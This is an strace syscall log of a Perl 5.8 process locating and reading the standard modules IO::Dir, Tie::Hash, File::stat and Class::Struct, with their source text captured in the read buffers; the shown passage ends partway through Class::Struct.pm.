8463  07:23:33.164958 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.164970 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
8463  07:23:33.164991 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.165005 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.165016 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.165036 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
8463  07:23:33.165547 stat64("/etc/perl/Tie/Hash.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165564 stat64("/etc/perl/Tie/Hash.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165578 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165591 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165608 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165621 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165635 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165646 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165659 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165671 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165684 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165696 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165710 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.165763 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
8463  07:23:33.165815 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.165847 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.165859 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.165891 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
8463  07:23:33.166196 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
8463  07:23:33.166842 read(8, "", 4096) = 0
8463  07:23:33.166872 close(8)          = 0
8463  07:23:33.166904 stat64("/etc/perl/File/stat.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.166919 stat64("/etc/perl/File/stat.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.166933 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.166946 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.166959 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.166972 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.166986 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.166998 stat64("/usr/lib/perl5/File/stat.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.167011 stat64("/usr/share/perl5/File/stat.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.167023 stat64("/usr/share/perl5/File/stat.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.167037 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.167049 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.167063 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.167076 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
8463  07:23:33.167097 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.167111 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.167123 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.167139 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
8463  07:23:33.167602 stat64("/etc/perl/Class/Struct.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.167620 stat64("/etc/perl/Class/Struct.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.167634 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.167647 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.167661 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.167674 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.167688 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.167700 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.167724 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.167763 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.167777 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.167805 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfbb26bc) = -1 ENOENT (No such file or directory)
8463  07:23:33.167819 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfbb27ac) = -1 ENOENT (No such file or directory)
8463  07:23:33.167832 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
8463  07:23:33.167857 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
8463  07:23:33.167872 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb24c8) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.167883 _llseek(10, 0, [0], SEEK_CUR) = 0
8463  07:23:33.167902 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
8463  07:23:33.168338 brk(0x82de000)    = 0x82de000
8463  07:23:33.168675 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? 